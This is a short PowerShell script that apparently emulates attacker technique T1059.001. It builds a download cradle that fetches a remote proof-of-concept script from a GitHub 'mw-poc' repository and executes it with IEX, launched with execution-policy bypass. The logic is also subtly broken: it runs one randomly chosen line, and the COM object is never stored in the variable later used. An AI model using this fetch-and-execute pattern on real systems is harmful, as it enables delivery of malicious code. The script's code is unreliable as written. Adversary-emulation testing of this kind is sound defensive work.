$cmd = @(
    'New-Object -ComObject MsXml2.ServerXmlHttp',
    '$comMsXml.Open(''GET'',''https://github.com/nicovarvara/mw-poc/raw/refs/heads/main/test-atomic-T1059.001.ps1'',$False)',
    '$comMsXml.Send()',
    'IEX $comMsXml.ResponseText'
)

$joinedCmd = ($cmd | Get-Random | Out-String).Trim()
powershell.exe -exec bypass -noprofile "$joinedCmd"
